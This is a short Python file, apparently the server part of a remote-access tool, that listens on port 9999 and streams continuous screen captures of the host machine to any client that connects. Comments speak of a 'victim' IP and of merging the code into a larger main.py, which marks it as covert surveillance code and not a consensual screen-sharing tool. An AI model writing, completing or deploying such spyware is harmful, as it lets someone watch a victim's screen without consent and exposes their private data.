

# Working code need to figure out how to
# implement it to main.py

# This code is for the server
# Lets import the libraries

# get user ip
from requests import get

# Socket Create
import socket
import cv2
import pickle
import struct
import imutils
import mss
import numpy
import time


# victim_ip = get('https://api.ipify.org').text
server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


def stream():

    # print(user_cmd)
    host_name  = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    print('HOST IP:',host_ip)
    port = 9999
    socket_address = (host_ip,port)

    # Socket Bind
    server_socket.bind(socket_address)

    # Socket Listen
    server_socket.listen(5)
    print("LISTENING AT:",socket_address)

    # Socket Accept
    while True:
        client_socket,addr = server_socket.accept()
        print('GOT CONNECTION FROM:',addr)
        if client_socket:
            with mss.mss() as sct:

                monitor = {"top": 20, "left": 195, "width": 1520, "height": 900}
                # vid = cv2.VideoCapture('vid.mp4')

                while "Screen capturing":
                    last_time = time.time()
                    img = numpy.array(sct.grab(monitor))
                    a = pickle.dumps(img)
                    message = struct.pack("Q",len(a))+a
                    client_socket.sendall(message)

                    key = cv2.waitKey(1) & 0xFF
                    if key  == ord('q'):
                        break
